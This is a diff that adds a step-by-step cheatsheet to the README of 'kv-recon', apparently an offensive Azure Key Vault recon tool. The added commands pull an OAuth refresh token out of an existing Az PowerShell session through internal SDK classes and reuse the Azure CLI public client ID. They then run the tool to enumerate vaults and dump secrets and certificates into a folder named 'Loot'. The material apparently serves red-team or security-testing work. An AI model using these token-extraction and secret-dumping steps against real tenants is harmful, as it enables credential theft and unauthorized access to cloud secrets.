@@ -100,6 +100,95 @@ All output is written to stdout. Secrets and certificates are also saved to the 
 
 ---
 
+## Step-by-Step Cheatsheet
+
+### Step 1 — Install Go (one-time)
+
+```powershell
+winget install GoLang.Go
+# Restart your terminal after install so `go` is on PATH
+go version
+```
+
+### Step 2 — Build the binary (one-time)
+
+```powershell
+cd KeyVault\kv-recon
+go mod tidy
+go build -o kv-recon.exe .
+```
+
+### Step 3 — Obtain a refresh token
+
+You need a valid OAuth refresh token for the target tenant. See `Authentication/` for methods.  
+The token must have access to `management.azure.com` and `vault.azure.net`.
+
+```powershell
+# Example: extract a refresh token from an existing Az PowerShell session
+$ctx   = Get-AzContext
+$token = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance `
+             .AuthenticationFactory.Authenticate(
+                 $ctx.Account, $ctx.Environment, $ctx.Tenant.Id, $null,
+                 [Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never,
+                 $null,
+                 "https://management.azure.com/"
+             )
+$token.RefreshToken
+```
+
+### Step 4 — Identify your Client ID and Tenant ID
+
+```powershell
+# Client ID — the Application (client) ID of the service principal / app registration
+# Tenant ID  — the GUID of the Azure AD tenant
+
+# If you are using a known first-party client ID (e.g., Azure CLI):
+$clientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"   # Azure CLI public client
+
+# Tenant ID from an existing session
+(Get-AzContext).Tenant.Id
+```
+
+### Step 5 — Run the recon
+
+```powershell
+# Enumerate ALL vaults in the subscription
+.\kv-recon.exe `
+  -refresh-token "<refresh_token>" `
+  -client-id     "<client_id>" `
+  -tenant-id     "<tenant_id>"
+
+# Target a SPECIFIC vault and save output to a custom directory
+.\kv-recon.exe `
+  -refresh-token "<refresh_token>" `
+  -client-id     "<client_id>" `
+  -tenant-id     "<tenant_id>" `
+  -vault-name    "<vault_name>" `
+  -output        "C:\Loot\KVRecon"
+
+# Tee output to both stdout and a log file
+.\kv-recon.exe `
+  -refresh-token "<refresh_token>" `
+  -client-id     "<client_id>" `
+  -tenant-id     "<tenant_id>" | Tee-Object -FilePath recon.log
+```
+
+### Step 6 — Review output
+
+```powershell
+# List saved files
+Get-ChildItem .\KVReconOutput -Recurse
+
+# View secrets for a specific vault
+Get-Content .\KVReconOutput\<vault-name>-secrets.txt
+
+# List exported certificates
+Get-ChildItem .\KVReconOutput -Filter *.pfx
+Get-ChildItem .\KVReconOutput -Filter *.pem
+```
+
+---
+
 ## What Gets Saved
 
 All output files are written to the configured **Output Path** directory.
